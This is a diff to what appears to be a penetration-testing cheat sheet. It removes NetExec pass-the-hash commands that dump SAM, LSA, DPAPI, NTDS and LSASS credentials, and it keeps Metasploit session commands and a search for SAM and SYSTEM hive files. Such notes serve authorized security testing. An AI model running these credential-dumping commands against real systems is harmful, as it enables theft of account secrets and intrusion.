@@ -543,10 +543,6 @@ background
 sessions
 sessions -i 1
 
-[*] Hash Dumping
-nxc smb $TARGET -u '$USERNAME' -H '$HASH' --sam --lsa --dpapi --ntds --local-auth
-nxc smb $TARGET -u '$USERNAME' -H '$HASH' -M lsassy --local-auth
-
 [*] Enumeration
 powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
 cd C:\ & dir /S /B SAM == SYSTEM == SAM.* == SYSTEM.*
